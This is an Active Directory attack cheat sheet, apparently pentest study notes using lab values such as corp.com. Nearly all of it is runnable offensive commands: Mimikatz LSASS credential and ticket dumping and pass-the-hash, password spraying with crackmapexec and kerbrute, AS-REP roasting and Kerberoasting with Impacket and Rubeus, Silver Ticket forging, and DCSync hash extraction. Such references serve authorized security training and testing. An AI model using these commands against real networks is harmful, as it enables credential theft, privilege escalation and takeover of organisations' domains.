## Active Directory Attack Cheat Sheet

### **Cached AD Credentials**

**READ MORE FROM PASSWORD ATTACKS MODULE**

Windows has **Single Sign-On (SSO)**, so passwords and tickets are stored in memory (LSASS). These credentials can be in **hashed or plaintext** forms.

- **Requirements:** `SYSTEM` privileges or at least `SeDebugPrivilege`
- **Tool:** Mimikatz
- **Module:** `sekurlsa` (interacts with LSASS)

#### **Mimikatz Commands:**

```powershell
# Engaging privileges
mimikatz # privilege::debug

# Dumping Credentials from Memory
mimikatz # sekurlsa::logonpasswords

# Extracting Kerberos Tickets
sekurlsa::tickets
sekurlsa::tickets /export

# Pass-the-Hash (PTH) Attack
sekurlsa::pth /user:Administrator /domain:corp.com /ntlm:<NTLM-HASH> /run:powershell.exe

# Dumping LSASS from a Process Dump
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords

# Dumping Cached Credentials
sekurlsa::cache
```

---

### **Finding Lockout Policy of AD**

```powershell
PS C:\Users\jeff> net accounts
```

Sample Output:

```
Lockout threshold:                                    5
Lockout duration (minutes):                           30
Lockout observation window (minutes):                30
```

---

### **Password Attacks in AD**

#### **1️⃣ Password Spraying with LDAP**

- **Windows:** Spray-Passwords.ps1
- **Linux:** `crackmapexec`

```powershell
# Windows
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin

# Linux
crackmapexec ldap <DC_IP> -u users.txt -p 'Winter2024'
```

#### **2️⃣ Password Spraying with SMB**

```bash
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```

This can help find **local admin privileges** on a machine.

crackmapexec supports  SMB, LDAP, WINRM, MSSQL, RDP.

#### **3️⃣ Password Spraying with TGT Requests**

**Tools:** `kerbrute`, `kinit`

we used kerbrute because it works on windows and linux.

```bash
# Username Enumeration
kerbrute userenum -d corp.com usernames.txt --dc 192.168.1.10

# Password Spraying
kerbrute passwordspray -d corp.com usernames.txt "P@ssword123" --dc 192.168.1.10

# Multiple Users with Multiple Passwords
kerbrute bruteuser -d corp.com user.txt passwords.txt --dc 192.168.1.10
```

---

### **AS-REP Roasting**

Allows retrieval of AS-REQ without pre-authentication.

**Tool:** `GetNPUsers`

```bash
impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete
```

**Windows Alternative:**

```powershell
Rubeus.exe asreproast /nowrap
```

**Finding AS-REP Roastable Accounts:**

- **PowerView:** `Get-DomainUser -PreauthNotRequired`
- **Impacket:** `impacket-GetNPUsers` (automatically detects vulnerable accounts)

---

### **Kerberoasting**

Stealing **service account** credentials linked to **SPNs**.

Simple process here u will ask DC for a service ticket (DC does not check if u have permission for that service). Then u use this ticket to crack hash of that service account.





- **Windows:** `Rubeus.exe`

```powershell
Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

- **Linux:** `impacket-GetUserSPNs`

```bash
impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
```

---

### **Silver Ticket Attack**

Allows an attacker to forge a **service ticket (TGS)** with elevated privileges.

When u have requested a  service ticket from DC the DC will provide u with a ticket even if u have no access but the access rights of that service will be low to none. So in this attack we have obtained a hash of service from having local administrator rights or from some other attack. This hash can be used to create another ticket which will look real to the service but with high privileges.

#### **Step 1: Extract NTLM Hash**

```powershell
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

#### **Step 2: Get DC SID**

````powershell
```
PS C:\Users\jeff> whoami /user

USER INFORMATION
----------------

User Name SID
========= =============================================
corp\jeff S-1-5-21-1987370270-658905905-1781884369-1105
````

SID = S-1-5-21-1987370270-658905905-1781884369 (remove the RID)

**Step 3: Forge a Silver Ticket**

```powershell
mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:<NTLM-Hash> /user:jeffadmin
```

---

### **Domain Controller Synchronization Attack**

Pretending to another DC. U can ask for object information.

Exploits DC replication rights to extract **NTLM hashes** of all users.

- **Required Privileges:**`Replicating Directory Changes,Replicating Directory Changes All, Replicating Directory Changes in Filtered Set`  rights.


- **Tools:** `mimikatz`, `impacket-secretsdump`

#### **Windows (Mimikatz)**

```powershell
mimikatz # lsadump::dcsync /user:corp\Administrator
```

#### **Linux (Impacket)**

```bash
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"P@ssw0rd!"@192.168.50.70
```

---

## **Summary**

This cheat sheet covers:

- **Credential Dumping** (LSASS, cached credentials, pass-the-hash)
- **Password Attacks** (Spraying with SMB, LDAP, Kerberos TGT requests)
- **Kerberoasting & AS-REP Roasting** (Extracting service account hashes)
- **Silver Ticket Attacks** (Forging service tickets for privilege escalation)
- **Domain Controller Synchronization** (Extracting all user hashes)

This is a structured reference for **Active Directory exploitation** using tools like **Mimikatz, Impacket, CrackMapExec, Rubeus, and Kerbrute**. 🚀

